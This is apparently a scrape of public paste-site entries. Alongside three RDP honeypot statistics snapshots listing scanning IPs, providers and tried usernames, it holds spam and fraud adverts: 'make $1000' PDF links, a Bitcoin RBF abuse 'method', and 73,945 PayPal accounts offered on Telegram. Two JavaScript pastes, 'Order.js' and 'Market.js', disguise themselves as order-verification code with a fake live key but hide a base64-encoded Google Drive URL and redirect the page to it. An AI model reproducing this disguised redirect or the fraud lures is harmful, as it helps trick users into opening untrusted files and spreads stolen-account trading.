id,title,username,language,date,content
gpvkcxw5,Make $1000 15-MINUTES  (BEGINNER) YR,TechBS,JavaScript,Friday 2nd of May 2025 07:20:07 PM CDT," 
Pdf https://tinyurl.com/freshleaks

uzhqAW7Mns
"
RZQrKvgE,2025-05-02_stats.json,rdp_snitch,JSON,Friday 2nd of May 2025 07:18:32 PM CDT,"{
  ""ip"": {
    ""45.117.177.2"": 2451,
    ""211.185.207.14"": 15,
    ""193.38.34.169"": 3,
    ""80.94.95.198"": 27,
    ""111.89.163.100"": 75,
    ""206.168.34.123"": 3,
    ""198.235.24.174"": 9,
    ""82.165.133.160"": 3,
    ""88.214.50.50"": 9,
    ""157.245.104.150"": 12,
    ""71.82.170.60"": 18,
    ""62.60.188.24"": 18,
    ""221.181.44.30"": 9,
    ""58.218.199.219"": 15,
    ""193.176.22.13"": 12,
    ""91.238.181.92"": 6,
    ""161.35.201.228"": 357,
    ""165.154.224.90"": 93,
    ""194.165.16.164"": 6,
    ""198.235.24.103"": 9,
    ""45.227.253.51"": 6,
    ""146.190.144.164"": 9,
    ""80.94.95.203"": 12,
    ""43.134.40.227"": 39,
    ""47.250.87.183"": 3,
    ""152.42.203.145"": 930,
    ""205.210.31.65"": 9,
    ""110.44.126.116"": 9,
    ""185.39.19.53"": 3,
    ""205.210.31.37"": 9
  },
  ""asn"": {
    ""AS131353"": 2451,
    ""AS4766"": 15,
    ""AS207279"": 3,
    ""AS204428"": 39,
    ""AS2514"": 75,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS8560"": 3,
    ""Unknown"": 21,
    ""AS14061"": 1308,
    ""AS20115"": 18,
    ""AS215930"": 18,
    ""AS9808"": 9,
    ""AS4134"": 15,
    ""AS49434"": 6,
    ""AS142002"": 93,
    ""AS48721"": 6,
    ""AS209272"": 6,
    ""AS132203"": 39,
    ""AS45102"": 3,
    ""AS45650"": 9,
    ""AS213021"": 3
  },
  ""isp"": {
    ""NHANHOA"": 2451,
    ""Korea Telecom"": 15,
    ""Markahost Telekomunikasyon VE Ticaret Limited Sirketi"": 3,
    ""SS-Net"": 39,
    ""NTT PC Communications, Inc."": 75,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""IONOS SE"": 3,
    ""SIA \""Singularity Telecom\"""": 21,
    ""DigitalOcean, LLC"": 1308,
    ""Charter Communications"": 18,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 18,
    ""China Mobile communications corporation"": 9,
    ""Chinanet"": 15,
    ""Datacenter location PAR1 France"": 6,
    ""Scloud Pte Ltd"": 93,
    ""Flyservers S.A."": 6,
    ""Flyservers S.A"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 39,
    ""Alibaba Cloud LLC"": 3,
    ""VIA NET COMMUNICATION PUBLIC LIMITED"": 9,
    ""Prime LLC"": 3
  },
  ""org"": {
    ""Branch of Nhan Hoa Software Company"": 2451,
    ""Kornet"": 15,
    ""Gokhan Coban"": 3,
    ""Unmanaged LTD"": 39,
    ""InfoSphere"": 75,
    ""Censys, Inc."": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""De Ber Ionos Cloud Txl"": 3,
    ""SIA \""Singularity Telecom\"""": 21,
    ""DigitalOcean, LLC"": 1308,
    ""Spectrum"": 18,
    ""UAB Host Baltic"": 18,
    ""China Mobile"": 9,
    ""Chinanet JS"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Scloud Pte Ltd"": 93,
    ""Flyservers S.A"": 6,
    ""Nextcloud S.A"": 6,
    ""Tencent Cloud Computing"": 39,
    ""Alibaba Cloud - MY"": 3,
    ""Vianet Communications Pvt. Ltd"": 9,
    ""Prime LLC"": 3
  },
  ""regionName"": {
    ""Ho Chi Minh"": 2451,
    ""Sejong-si"": 15,
    ""Istanbul"": 3,
    ""Budapest"": 39,
    ""Tokyo"": 75,
    ""Illinois"": 3,
    ""California"": 45,
    ""State of Berlin"": 3,
    ""New York"": 21,
    ""Karnataka"": 12,
    ""Wisconsin"": 18,
    ""Tehran"": 18,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""\u00cele-de-France"": 6,
    ""Hesse"": 357,
    ""Kowloon"": 93,
    ""Kaunas"": 6,
    ""La Paz Department"": 6,
    ""North West"": 39,
    ""Kuala Lumpur"": 3,
    ""South West"": 930,
    ""Bagmati Province"": 9,
    ""Moscow"": 3
  },
  ""country"": {
    ""Vietnam"": 2451,
    ""South Korea"": 15,
    ""Turkey"": 3,
    ""Hungary"": 39,
    ""Japan"": 75,
    ""United States"": 87,
    ""Germany"": 360,
    ""India"": 12,
    ""Iran"": 18,
    ""China"": 24,
    ""France"": 6,
    ""Hong Kong"": 93,
    ""Lithuania"": 6,
    ""Bolivia"": 6,
    ""Singapore"": 969,
    ""Malaysia"": 3,
    ""Nepal"": 9,
    ""Russia"": 3
  },
  ""account"": {
    ""hello"": 3948,
    ""142.93.8.59"": 135,
    ""(empty)"": 3,
    ""qIGHrJuvQ"": 3,
    ""fvugBD"": 3,
    ""YzlLoe"": 3,
    ""Domain"": 15,
    ""Test"": 18,
    ""XsBcoZDtS"": 3,
    ""MILKAt"": 3,
    ""ERhGnf"": 3,
    ""Administr"": 21,
    ""Almaz"": 3,
    ""kYpknGxll"": 3,
    ""lsudfe"": 3,
    ""QJsmDC"": 3,
    ""Utbendcwz"": 3,
    ""coNgyO"": 3,
    ""aSeASp"": 3
  },
  ""keyboard"": {
    ""Unknown"": 4179
  },
  ""client_build"": {
    ""Unknown"": 4179
  },
  ""client_name"": {
    ""Unknown"": 4179
  },
  ""ip_type"": {
    ""hosting"": 3477,
    ""Unknown"": 309,
    ""hosting & proxy"": 369,
    ""mobile"": 9,
    ""proxy"": 15
  }
}"
2CuNjFEi,2025-05-02_stats.json,rdp_snitch,JSON,Friday 2nd of May 2025 07:16:15 PM CDT,"{
  ""ip"": {
    ""45.117.177.2"": 1634,
    ""211.185.207.14"": 10,
    ""193.38.34.169"": 2,
    ""80.94.95.198"": 18,
    ""111.89.163.100"": 50,
    ""206.168.34.123"": 2,
    ""198.235.24.174"": 6,
    ""82.165.133.160"": 2,
    ""88.214.50.50"": 6,
    ""157.245.104.150"": 8,
    ""71.82.170.60"": 12,
    ""62.60.188.24"": 12,
    ""221.181.44.30"": 6,
    ""58.218.199.219"": 10,
    ""193.176.22.13"": 8,
    ""91.238.181.92"": 4,
    ""161.35.201.228"": 238,
    ""165.154.224.90"": 62,
    ""194.165.16.164"": 4,
    ""198.235.24.103"": 6,
    ""45.227.253.51"": 4,
    ""146.190.144.164"": 6,
    ""80.94.95.203"": 8,
    ""43.134.40.227"": 26,
    ""47.250.87.183"": 2,
    ""152.42.203.145"": 620,
    ""205.210.31.65"": 6,
    ""110.44.126.116"": 6,
    ""185.39.19.53"": 2,
    ""205.210.31.37"": 6
  },
  ""asn"": {
    ""AS131353"": 1634,
    ""AS4766"": 10,
    ""AS207279"": 2,
    ""AS204428"": 26,
    ""AS2514"": 50,
    ""AS398324"": 2,
    ""AS396982"": 24,
    ""AS8560"": 2,
    ""Unknown"": 14,
    ""AS14061"": 872,
    ""AS20115"": 12,
    ""AS215930"": 12,
    ""AS9808"": 6,
    ""AS4134"": 10,
    ""AS49434"": 4,
    ""AS142002"": 62,
    ""AS48721"": 4,
    ""AS209272"": 4,
    ""AS132203"": 26,
    ""AS45102"": 2,
    ""AS45650"": 6,
    ""AS213021"": 2
  },
  ""isp"": {
    ""NHANHOA"": 1634,
    ""Korea Telecom"": 10,
    ""Markahost Telekomunikasyon VE Ticaret Limited Sirketi"": 2,
    ""SS-Net"": 26,
    ""NTT PC Communications, Inc."": 50,
    ""Censys, Inc."": 2,
    ""Google LLC"": 24,
    ""IONOS SE"": 2,
    ""SIA \""Singularity Telecom\"""": 14,
    ""DigitalOcean, LLC"": 872,
    ""Charter Communications"": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 12,
    ""China Mobile communications corporation"": 6,
    ""Chinanet"": 10,
    ""Datacenter location PAR1 France"": 4,
    ""Scloud Pte Ltd"": 62,
    ""Flyservers S.A."": 4,
    ""Flyservers S.A"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 26,
    ""Alibaba Cloud LLC"": 2,
    ""VIA NET COMMUNICATION PUBLIC LIMITED"": 6,
    ""Prime LLC"": 2
  },
  ""org"": {
    ""Branch of Nhan Hoa Software Company"": 1634,
    ""Kornet"": 10,
    ""Gokhan Coban"": 2,
    ""Unmanaged LTD"": 26,
    ""InfoSphere"": 50,
    ""Censys, Inc."": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""De Ber Ionos Cloud Txl"": 2,
    ""SIA \""Singularity Telecom\"""": 14,
    ""DigitalOcean, LLC"": 872,
    ""Spectrum"": 12,
    ""UAB Host Baltic"": 12,
    ""China Mobile"": 6,
    ""Chinanet JS"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Scloud Pte Ltd"": 62,
    ""Flyservers S.A"": 4,
    ""Nextcloud S.A"": 4,
    ""Tencent Cloud Computing"": 26,
    ""Alibaba Cloud - MY"": 2,
    ""Vianet Communications Pvt. Ltd"": 6,
    ""Prime LLC"": 2
  },
  ""regionName"": {
    ""Ho Chi Minh"": 1634,
    ""Sejong-si"": 10,
    ""Istanbul"": 2,
    ""Budapest"": 26,
    ""Tokyo"": 50,
    ""Illinois"": 2,
    ""California"": 30,
    ""State of Berlin"": 2,
    ""New York"": 14,
    ""Karnataka"": 8,
    ""Wisconsin"": 12,
    ""Tehran"": 12,
    ""Guangdong"": 6,
    ""Jiangsu"": 10,
    ""\u00cele-de-France"": 4,
    ""Hesse"": 238,
    ""Kowloon"": 62,
    ""Kaunas"": 4,
    ""La Paz Department"": 4,
    ""North West"": 26,
    ""Kuala Lumpur"": 2,
    ""South West"": 620,
    ""Bagmati Province"": 6,
    ""Moscow"": 2
  },
  ""country"": {
    ""Vietnam"": 1634,
    ""South Korea"": 10,
    ""Turkey"": 2,
    ""Hungary"": 26,
    ""Japan"": 50,
    ""United States"": 58,
    ""Germany"": 240,
    ""India"": 8,
    ""Iran"": 12,
    ""China"": 16,
    ""France"": 4,
    ""Hong Kong"": 62,
    ""Lithuania"": 4,
    ""Bolivia"": 4,
    ""Singapore"": 646,
    ""Malaysia"": 2,
    ""Nepal"": 6,
    ""Russia"": 2
  },
  ""account"": {
    ""hello"": 2632,
    ""142.93.8.59"": 90,
    ""(empty)"": 2,
    ""qIGHrJuvQ"": 2,
    ""fvugBD"": 2,
    ""YzlLoe"": 2,
    ""Domain"": 10,
    ""Test"": 12,
    ""XsBcoZDtS"": 2,
    ""MILKAt"": 2,
    ""ERhGnf"": 2,
    ""Administr"": 14,
    ""Almaz"": 2,
    ""kYpknGxll"": 2,
    ""lsudfe"": 2,
    ""QJsmDC"": 2,
    ""Utbendcwz"": 2,
    ""coNgyO"": 2,
    ""aSeASp"": 2
  },
  ""keyboard"": {
    ""Unknown"": 2786
  },
  ""client_build"": {
    ""Unknown"": 2786
  },
  ""client_name"": {
    ""Unknown"": 2786
  },
  ""ip_type"": {
    ""hosting"": 2318,
    ""Unknown"": 206,
    ""hosting & proxy"": 246,
    ""mobile"": 6,
    ""proxy"": 10
  }
}"
HW5A5iJQ,2025-05-02_stats.json,rdp_snitch,JSON,Friday 2nd of May 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""45.117.177.2"": 817,
    ""211.185.207.14"": 5,
    ""193.38.34.169"": 1,
    ""80.94.95.198"": 9,
    ""111.89.163.100"": 25,
    ""206.168.34.123"": 1,
    ""198.235.24.174"": 3,
    ""82.165.133.160"": 1,
    ""88.214.50.50"": 3,
    ""157.245.104.150"": 4,
    ""71.82.170.60"": 6,
    ""62.60.188.24"": 6,
    ""221.181.44.30"": 3,
    ""58.218.199.219"": 5,
    ""193.176.22.13"": 4,
    ""91.238.181.92"": 2,
    ""161.35.201.228"": 119,
    ""165.154.224.90"": 31,
    ""194.165.16.164"": 2,
    ""198.235.24.103"": 3,
    ""45.227.253.51"": 2,
    ""146.190.144.164"": 3,
    ""80.94.95.203"": 4,
    ""43.134.40.227"": 13,
    ""47.250.87.183"": 1,
    ""152.42.203.145"": 310,
    ""205.210.31.65"": 3,
    ""110.44.126.116"": 3,
    ""185.39.19.53"": 1,
    ""205.210.31.37"": 3
  },
  ""asn"": {
    ""AS131353"": 817,
    ""AS4766"": 5,
    ""AS207279"": 1,
    ""AS204428"": 13,
    ""AS2514"": 25,
    ""AS398324"": 1,
    ""AS396982"": 12,
    ""AS8560"": 1,
    ""Unknown"": 7,
    ""AS14061"": 436,
    ""AS20115"": 6,
    ""AS215930"": 6,
    ""AS9808"": 3,
    ""AS4134"": 5,
    ""AS49434"": 2,
    ""AS142002"": 31,
    ""AS48721"": 2,
    ""AS209272"": 2,
    ""AS132203"": 13,
    ""AS45102"": 1,
    ""AS45650"": 3,
    ""AS213021"": 1
  },
  ""isp"": {
    ""NHANHOA"": 817,
    ""Korea Telecom"": 5,
    ""Markahost Telekomunikasyon VE Ticaret Limited Sirketi"": 1,
    ""SS-Net"": 13,
    ""NTT PC Communications, Inc."": 25,
    ""Censys, Inc."": 1,
    ""Google LLC"": 12,
    ""IONOS SE"": 1,
    ""SIA \""Singularity Telecom\"""": 7,
    ""DigitalOcean, LLC"": 436,
    ""Charter Communications"": 6,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""China Mobile communications corporation"": 3,
    ""Chinanet"": 5,
    ""Datacenter location PAR1 France"": 2,
    ""Scloud Pte Ltd"": 31,
    ""Flyservers S.A."": 2,
    ""Flyservers S.A"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 13,
    ""Alibaba Cloud LLC"": 1,
    ""VIA NET COMMUNICATION PUBLIC LIMITED"": 3,
    ""Prime LLC"": 1
  },
  ""org"": {
    ""Branch of Nhan Hoa Software Company"": 817,
    ""Kornet"": 5,
    ""Gokhan Coban"": 1,
    ""Unmanaged LTD"": 13,
    ""InfoSphere"": 25,
    ""Censys, Inc."": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""De Ber Ionos Cloud Txl"": 1,
    ""SIA \""Singularity Telecom\"""": 7,
    ""DigitalOcean, LLC"": 436,
    ""Spectrum"": 6,
    ""UAB Host Baltic"": 6,
    ""China Mobile"": 3,
    ""Chinanet JS"": 5,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Scloud Pte Ltd"": 31,
    ""Flyservers S.A"": 2,
    ""Nextcloud S.A"": 2,
    ""Tencent Cloud Computing"": 13,
    ""Alibaba Cloud - MY"": 1,
    ""Vianet Communications Pvt. Ltd"": 3,
    ""Prime LLC"": 1
  },
  ""regionName"": {
    ""Ho Chi Minh"": 817,
    ""Sejong-si"": 5,
    ""Istanbul"": 1,
    ""Budapest"": 13,
    ""Tokyo"": 25,
    ""Illinois"": 1,
    ""California"": 15,
    ""State of Berlin"": 1,
    ""New York"": 7,
    ""Karnataka"": 4,
    ""Wisconsin"": 6,
    ""Tehran"": 6,
    ""Guangdong"": 3,
    ""Jiangsu"": 5,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 119,
    ""Kowloon"": 31,
    ""Kaunas"": 2,
    ""La Paz Department"": 2,
    ""North West"": 13,
    ""Kuala Lumpur"": 1,
    ""South West"": 310,
    ""Bagmati Province"": 3,
    ""Moscow"": 1
  },
  ""country"": {
    ""Vietnam"": 817,
    ""South Korea"": 5,
    ""Turkey"": 1,
    ""Hungary"": 13,
    ""Japan"": 25,
    ""United States"": 29,
    ""Germany"": 120,
    ""India"": 4,
    ""Iran"": 6,
    ""China"": 8,
    ""France"": 2,
    ""Hong Kong"": 31,
    ""Lithuania"": 2,
    ""Bolivia"": 2,
    ""Singapore"": 323,
    ""Malaysia"": 1,
    ""Nepal"": 3,
    ""Russia"": 1
  },
  ""account"": {
    ""hello"": 1316,
    ""142.93.8.59"": 45,
    ""(empty)"": 1,
    ""qIGHrJuvQ"": 1,
    ""fvugBD"": 1,
    ""YzlLoe"": 1,
    ""Domain"": 5,
    ""Test"": 6,
    ""XsBcoZDtS"": 1,
    ""MILKAt"": 1,
    ""ERhGnf"": 1,
    ""Administr"": 7,
    ""Almaz"": 1,
    ""kYpknGxll"": 1,
    ""lsudfe"": 1,
    ""QJsmDC"": 1,
    ""Utbendcwz"": 1,
    ""coNgyO"": 1,
    ""aSeASp"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1393
  },
  ""client_build"": {
    ""Unknown"": 1393
  },
  ""client_name"": {
    ""Unknown"": 1393
  },
  ""ip_type"": {
    ""hosting"": 1159,
    ""Unknown"": 103,
    ""hosting & proxy"": 123,
    ""mobile"": 3,
    ""proxy"": 5
  }
}"
rNnnH7XH,EARN $900 INSTANTLY 2025 95,TechBS,JavaScript,Friday 2nd of May 2025 07:10:54 PM CDT," 
Pdf https://tinyurl.com/freshleaks

LUhKAlLl4Y
"
bym58wCC,Order.js,rodrigomaise99,JavaScript,Friday 2nd of May 2025 07:08:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43602/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
F2S7sy8G,Abuse RBF in BTC transactions,Xp_Isolation,JavaScript,Friday 2nd of May 2025 07:08:06 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 24884
yZf57Rgv,PayPal with Balance,iLoveToWatch,JavaScript,Friday 2nd of May 2025 07:07:50 PM CDT,73945 Accounts Posted On https://t.me/leakzbyeminem
M3RkhiLN,Make $1000 15-MINUTES (BEGINNER) L4,TechBS,JavaScript,Friday 2nd of May 2025 07:01:40 PM CDT," 
Pdf https://tinyurl.com/freshleaks

ceBRUVHsX7
"
YzDugAVQ,Market.js,rodrigomaise99,JavaScript,Friday 2nd of May 2025 06:53:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48455/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
